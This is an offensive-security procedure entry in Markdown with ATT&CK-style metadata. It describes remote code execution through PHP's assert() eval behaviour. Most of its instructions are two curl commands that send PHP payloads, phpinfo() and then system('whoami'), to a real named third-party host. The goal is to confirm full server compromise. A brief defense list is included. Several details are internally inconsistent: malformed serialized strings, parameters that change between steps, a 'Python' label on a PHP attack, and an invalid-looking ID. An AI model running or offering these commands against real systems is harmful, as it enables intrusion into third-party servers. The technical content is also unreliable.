---
id: d4e5f6g7-h8i9-0123-defg-456789012345
tags:
  - rce
  - php
  - assert
  - eval
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-invoke-php-assert]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:23:36.441Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Python]]'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
---
# Invoke-Assert-Function-for-Arbitrary-Code-Execution

## Summary

This procedure invokes the assert function with a user-controlled string after type manipulation, leveraging its eval behavior (pre-PHP 7 updates) to execute arbitrary PHP code, resulting in full server compromise.

## Description

Following parameter manipulation, the assert function is called as a callback with a malicious string containing PHP code (e.g., system commands). In the vulnerable version, assert evaluated the string directly. This targets PHP web apps with dynamic function calls. Prerequisites: Type coercion success and knowledge of assert's behavior. Outcomes: RCE with potential for shell access, data exfiltration, or persistence.

## Requirements

1. Successful type manipulation from previous step
2. Knowledge of PHP eval-vulnerable functions like assert
3. Secure encoding of payloads to avoid breaking serialization

## Defense

Defensive measures and detection strategies:

- Disable or configure assert to not use eval (assert.active = 0 in php.ini)
- Input validation to block dangerous functions like assert
- WAF rules to detect serialized payloads and function names in parameters
- Runtime monitoring for unexpected code execution

## Objectives

1. Call assert with arbitrary string payload
2. Trigger eval for code execution
3. Confirm RCE via command output

## Instructions

### Step 1: Prepare Malicious Payload

**Context**: Encode PHP code as a string parameter for assert eval.

**Command** ([[commands/curl-invoke-php-assert]]):
```bash
curl -X POST https://partner.steampowered.com/endpoint \
  -d "function_name=array_diff_uassoc&param_types=array,array,string&param1=\"a:1:{s:6:\"0\";s:6:\"assert\"}\" &param2=\"assert\" &param3=\"phpinfo();\" \
  -v
```

> Payload 'phpinfo();' executes, returning PHP configuration details if successful.

### Step 2: Escalate to System Command

**Context**: Use system() for shell commands to achieve full RCE.

**Command** ([[commands/curl-invoke-php-assert]]):
```bash
curl -X POST https://partner.steampowered.com/endpoint \
  -d "function_name=array_diff_uassoc&param_types=array,array,string&param1=\"assert\" &param2=\"callback\" &param3=\"system('whoami');\" \
  -v
```

> Expected output includes the web server's user (e.g., 'www-data'), confirming compromise.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques

- [[Python]]

## Commands Used

- [[commands/curl-invoke-php-assert]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[rce]]
- [[command-injection]]
